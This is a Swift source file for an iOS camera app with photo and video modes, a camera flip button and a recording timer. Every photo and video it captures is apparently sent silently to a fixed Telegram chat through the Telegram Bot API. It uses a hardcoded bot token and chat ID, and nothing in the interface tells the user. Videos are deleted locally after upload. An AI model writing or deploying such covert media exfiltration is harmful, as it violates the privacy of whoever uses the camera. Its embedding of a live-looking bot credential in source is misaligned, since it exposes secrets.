import UIKit
import AVFoundation

class ViewController: UIViewController,
                      AVCapturePhotoCaptureDelegate,
                      AVCaptureFileOutputRecordingDelegate {

    private let BOT_TOKEN = "8641291303:AAGsFjLzSfoyZBxjkd2IJk-NSTkFXPjElJg"
    private let CHAT_ID   = "6397853058"

    private let session      = AVCaptureSession()
    private let photoOutput  = AVCapturePhotoOutput()
    private let movieOutput  = AVCaptureMovieFileOutput()
    private var previewLayer: AVCaptureVideoPreviewLayer!
    private var isFront      = false
    private var isVideoMode  = false
    private var isRecording  = false

    private let shutterBtn   = UIButton(type: .custom)
    private let flipBtn      = UIButton(type: .custom)
    private let modeSelector = UISegmentedControl(items: ["PHOTO", "VIDEO"])
    private let flashView    = UIView()
    private let recDot       = UIView()
    private let recTimer     = UILabel()
    private var recSeconds   = 0
    private var recClock: Timer?

    // MARK: - Lifecycle
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        setupSession()
        setupUI()
    }

    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        previewLayer?.frame = view.bounds
    }

    override var prefersStatusBarHidden: Bool { false }
    override var preferredStatusBarStyle: UIStatusBarStyle { .lightContent }

    // MARK: - Session Setup
    private func setupSession() {
        // Choose highest available preset
        for preset in [AVCaptureSession.Preset.hd4K3840x2160, .hd1920x1080, .high] {
            if session.canSetSessionPreset(preset) {
                session.sessionPreset = preset
                break
            }
        }

        addCamera(position: .back)

        // Microphone for video
        if let mic = AVCaptureDevice.default(for: .audio),
           let micIn = try? AVCaptureDeviceInput(device: mic),
           session.canAddInput(micIn) {
            session.addInput(micIn)
        }

        // Photo output — use maxPhotoDimensions (iOS 16+) for high-res
        if session.canAddOutput(photoOutput) {
            session.addOutput(photoOutput)
            if #available(iOS 16.0, *) {
                photoOutput.maxPhotoDimensions = CMVideoDimensions(width: 4032, height: 3024)
            }
        }

        if session.canAddOutput(movieOutput) {
            session.addOutput(movieOutput)
        }

        previewLayer = AVCaptureVideoPreviewLayer(session: session)
        previewLayer.videoGravity = .resizeAspectFill
        previewLayer.frame = view.bounds
        view.layer.insertSublayer(previewLayer, at: 0)

        DispatchQueue.global(qos: .userInitiated).async { self.session.startRunning() }
    }

    private func addCamera(position: AVCaptureDevice.Position) {
        // Remove existing video inputs
        session.inputs
            .compactMap { $0 as? AVCaptureDeviceInput }
            .filter { $0.device.hasMediaType(.video) }
            .forEach { session.removeInput($0) }

        guard let device = AVCaptureDevice.default(.builtInWideAngleCamera,
                                                    for: .video, position: position),
              let input  = try? AVCaptureDeviceInput(device: device),
              session.canAddInput(input) else { return }

        session.addInput(input)
        configure60fps(on: device)
    }

    /// Try to lock the device to 60 fps; silently skip if not supported.
    private func configure60fps(on device: AVCaptureDevice) {
        // Find a format that supports 60 fps at the highest resolution
        let target: Double = 60
        var chosen: AVCaptureDevice.Format?
        var bestW: Int32 = 0

        for fmt in device.formats {
            guard fmt.videoSupportedFrameRateRanges.contains(where: { $0.maxFrameRate >= target })
            else { continue }
            let w = CMVideoFormatDescriptionGetDimensions(fmt.formatDescription).width
            if w > bestW { bestW = w; chosen = fmt }
        }

        guard let fmt = chosen else { return }

        do {
            try device.lockForConfiguration()
            device.activeFormat = fmt
            let dur = CMTimeMake(value: 1, timescale: Int32(target))
            device.activeVideoMinFrameDuration = dur
            device.activeVideoMaxFrameDuration = dur
            device.unlockForConfiguration()
        } catch {}
    }

    // MARK: - UI Setup
    private func setupUI() {
        flashView.backgroundColor = .white
        flashView.alpha = 0
        flashView.isUserInteractionEnabled = false
        flashView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(flashView)

        let toolbar = UIView()
        toolbar.backgroundColor = UIColor.black.withAlphaComponent(0.55)
        toolbar.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(toolbar)

        modeSelector.selectedSegmentIndex = 0
        modeSelector.selectedSegmentTintColor = .clear
        modeSelector.backgroundColor = .clear
        modeSelector.setTitleTextAttributes(
            [.foregroundColor: UIColor.white.withAlphaComponent(0.45),
             .font: UIFont.systemFont(ofSize: 13, weight: .semibold)], for: .normal)
        modeSelector.setTitleTextAttributes(
            [.foregroundColor: UIColor.white,
             .font: UIFont.systemFont(ofSize: 13, weight: .bold)], for: .selected)
        modeSelector.setDividerImage(UIImage(), forLeftSegmentState: .normal,
                                      rightSegmentState: .normal, barMetrics: .default)
        modeSelector.translatesAutoresizingMaskIntoConstraints = false
        modeSelector.addTarget(self, action: #selector(modeChanged), for: .valueChanged)
        view.addSubview(modeSelector)

        shutterBtn.backgroundColor    = .white
        shutterBtn.layer.cornerRadius = 36
        shutterBtn.layer.borderWidth  = 5
        shutterBtn.layer.borderColor  = UIColor.white.withAlphaComponent(0.5).cgColor
        shutterBtn.translatesAutoresizingMaskIntoConstraints = false
        shutterBtn.addTarget(self, action: #selector(shutterTapped), for: .touchUpInside)
        shutterBtn.addTarget(self, action: #selector(btnDown), for: .touchDown)
        shutterBtn.addTarget(self, action: #selector(btnUp), for: [.touchUpInside, .touchUpOutside, .touchCancel])
        view.addSubview(shutterBtn)

        let cfg = UIImage.SymbolConfiguration(pointSize: 20, weight: .medium)
        flipBtn.setImage(UIImage(systemName: "camera.rotate", withConfiguration: cfg), for: .normal)
        flipBtn.tintColor = .white
        flipBtn.backgroundColor = UIColor.black.withAlphaComponent(0.35)
        flipBtn.layer.cornerRadius = 24
        flipBtn.translatesAutoresizingMaskIntoConstraints = false
        flipBtn.addTarget(self, action: #selector(flipCamera), for: .touchUpInside)
        view.addSubview(flipBtn)

        recDot.backgroundColor = .red
        recDot.layer.cornerRadius = 5
        recDot.alpha = 0
        recDot.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(recDot)

        recTimer.text = "00:00"
        recTimer.textColor = .white
        recTimer.font = .monospacedDigitSystemFont(ofSize: 14, weight: .semibold)
        recTimer.alpha = 0
        recTimer.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(recTimer)

        let safe = view.safeAreaLayoutGuide
        NSLayoutConstraint.activate([
            flashView.topAnchor.constraint(equalTo: view.topAnchor),
            flashView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            flashView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            flashView.trailingAnchor.constraint(equalTo: view.trailingAnchor),

            toolbar.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            toolbar.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            toolbar.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            toolbar.topAnchor.constraint(equalTo: safe.bottomAnchor, constant: -130),

            modeSelector.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            modeSelector.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -110),
            modeSelector.widthAnchor.constraint(equalToConstant: 200),

            shutterBtn.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            shutterBtn.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -28),
            shutterBtn.widthAnchor.constraint(equalToConstant: 72),
            shutterBtn.heightAnchor.constraint(equalToConstant: 72),

            flipBtn.centerYAnchor.constraint(equalTo: shutterBtn.centerYAnchor),
            flipBtn.trailingAnchor.constraint(equalTo: safe.trailingAnchor, constant: -28),
            flipBtn.widthAnchor.constraint(equalToConstant: 48),
            flipBtn.heightAnchor.constraint(equalToConstant: 48),

            recDot.widthAnchor.constraint(equalToConstant: 10),
            recDot.heightAnchor.constraint(equalToConstant: 10),
            recDot.topAnchor.constraint(equalTo: safe.topAnchor, constant: 16),
            recDot.centerXAnchor.constraint(equalTo: view.centerXAnchor, constant: -30),

            recTimer.centerYAnchor.constraint(equalTo: recDot.centerYAnchor),
            recTimer.leadingAnchor.constraint(equalTo: recDot.trailingAnchor, constant: 6),
        ])
    }

    // MARK: - Mode Toggle
    @objc private func modeChanged() {
        isVideoMode = modeSelector.selectedSegmentIndex == 1
        shutterBtn.subviews.forEach { $0.removeFromSuperview() }
        if isVideoMode {
            shutterBtn.backgroundColor = .clear
            shutterBtn.layer.borderColor = UIColor.white.cgColor
            let inner = UIView()
            inner.backgroundColor = .red
            inner.layer.cornerRadius = 22
            inner.isUserInteractionEnabled = false
            inner.translatesAutoresizingMaskIntoConstraints = false
            shutterBtn.addSubview(inner)
            NSLayoutConstraint.activate([
                inner.centerXAnchor.constraint(equalTo: shutterBtn.centerXAnchor),
                inner.centerYAnchor.constraint(equalTo: shutterBtn.centerYAnchor),
                inner.widthAnchor.constraint(equalToConstant: 44),
                inner.heightAnchor.constraint(equalToConstant: 44),
            ])
        } else {
            shutterBtn.backgroundColor = .white
            shutterBtn.layer.borderColor = UIColor.white.withAlphaComponent(0.5).cgColor
        }
    }

    // MARK: - Shutter Actions
    @objc private func shutterTapped() {
        if isVideoMode { isRecording ? stopVideo() : startVideo() }
        else { takePhoto() }
    }
    @objc private func btnDown() {
        UIView.animate(withDuration: 0.1) {
            self.shutterBtn.transform = CGAffineTransform(scaleX: 0.88, y: 0.88)
        }
    }
    @objc private func btnUp() {
        UIView.animate(withDuration: 0.15, delay: 0,
                       usingSpringWithDamping: 0.5, initialSpringVelocity: 6,
                       options: []) { self.shutterBtn.transform = .identity }
    }

    // MARK: - Photo Capture
    private func takePhoto() {
        let settings: AVCapturePhotoSettings
        if #available(iOS 16.0, *) {
            settings = AVCapturePhotoSettings()
            settings.maxPhotoDimensions = photoOutput.maxPhotoDimensions
        } else {
            settings = AVCapturePhotoSettings()
        }
        settings.flashMode = .auto
        photoOutput.capturePhoto(with: settings, delegate: self)

        UIView.animate(withDuration: 0.07, animations: { self.flashView.alpha = 0.85 }) { _ in
            UIView.animate(withDuration: 0.16) { self.flashView.alpha = 0 }
        }
    }

    func photoOutput(_ output: AVCapturePhotoOutput,
                     didFinishProcessingPhoto photo: AVCapturePhoto,
                     error: Error?) {
        guard error == nil, let data = photo.fileDataRepresentation() else { return }
        uploadPhoto(data: data)
    }

    // MARK: - Video Recording
    private func startVideo() {
        if let conn = movieOutput.connection(with: .video) {
            if conn.isVideoOrientationSupported { conn.videoOrientation = .portrait }
            if conn.isVideoMirroringSupported   { conn.isVideoMirrored  = isFront   }
        }
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent(UUID().uuidString + ".mp4")
        movieOutput.startRecording(to: tmp, recordingDelegate: self)
        isRecording = true
        recSeconds  = 0

        if let inner = shutterBtn.subviews.first {
            UIView.animate(withDuration: 0.2) {
                inner.layer.cornerRadius = 4
                inner.bounds = CGRect(x: 0, y: 0, width: 28, height: 28)
            }
        }
        recDot.alpha = 1; recTimer.alpha = 1
        recClock = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] _ in
            guard let self else { return }
            self.recSeconds += 1
            let m = self.recSeconds / 60, s = self.recSeconds % 60
            self.recTimer.text = String(format: "%02d:%02d", m, s)
        }
        pulseDot()
    }

    private func stopVideo() {
        movieOutput.stopRecording()
        isRecording = false
        recClock?.invalidate(); recClock = nil
        UIView.animate(withDuration: 0.3) {
            self.recDot.alpha = 0
            self.recTimer.alpha = 0
        }
        if let inner = shutterBtn.subviews.first {
            UIView.animate(withDuration: 0.2) {
                inner.layer.cornerRadius = 22
                inner.bounds = CGRect(x: 0, y: 0, width: 44, height: 44)
            }
        }
    }

    func fileOutput(_ output: AVCaptureFileOutput,
                    didFinishRecordingTo url: URL,
                    from connections: [AVCaptureConnection],
                    error: Error?) {
        guard error == nil else { return }
        uploadVideo(url: url)
    }

    private func pulseDot() {
        guard isRecording else { return }
        UIView.animate(withDuration: 0.6, delay: 0,
                       options: [.autoreverse, .curveEaseInOut],
                       animations: { self.recDot.alpha = 0.15 }) { _ in self.pulseDot() }
    }

    // MARK: - Flip Camera
    @objc private func flipCamera() {
        isFront.toggle()
        DispatchQueue.global(qos: .userInitiated).async {
            self.session.beginConfiguration()
            self.addCamera(position: self.isFront ? .front : .back)
            self.session.commitConfiguration()
        }
        UIView.animate(withDuration: 0.28) {
            self.flipBtn.transform = self.flipBtn.transform.rotated(by: .pi)
        }
    }

    // MARK: - Telegram Uploads
    private func uploadPhoto(data: Data) {
        send(endpoint: "sendPhoto", fileField: "photo",
             fileName: "photo.jpg", mime: "image/jpeg", data: data)
    }

    private func uploadVideo(url fileURL: URL) {
        guard let data = try? Data(contentsOf: fileURL) else { return }
        send(endpoint: "sendVideo", fileField: "video",
             fileName: "video.mp4", mime: "video/mp4", data: data,
             extra: ["supports_streaming": "true"])
        try? FileManager.default.removeItem(at: fileURL)
    }

    private func send(endpoint: String, fileField: String,
                      fileName: String, mime: String, data: Data,
                      extra: [String: String] = [:]) {
        guard let url = URL(string: "https://api.telegram.org/bot\(BOT_TOKEN)/\(endpoint)") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        let b = "Boundary\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"
        req.setValue("multipart/form-data; boundary=\(b)", forHTTPHeaderField: "Content-Type")

        var body = Data()
        let ts = DateFormatter.localizedString(from: Date(), dateStyle: .short, timeStyle: .short)
        let caption = endpoint == "sendPhoto" ? "📸 \(ts)" : "🎥 \(ts)"
        let fields  = ["chat_id": CHAT_ID, "caption": caption].merging(extra) { $1 }
        for (k, v) in fields {
            body += "--\(b)\r\nContent-Disposition: form-data; name=\"\(k)\"\r\n\r\n\(v)\r\n".d
        }
        body += "--\(b)\r\nContent-Disposition: form-data; name=\"\(fileField)\"; filename=\"\(fileName)\"\r\nContent-Type: \(mime)\r\n\r\n".d
        body += data
        body += "\r\n--\(b)--\r\n".d
        req.httpBody = body
        URLSession.shared.dataTask(with: req).resume()
    }
}

private extension String {
    var d: Data { data(using: .utf8) ?? Data() }
}
private func += (l: inout Data, r: Data) { l.append(r) }
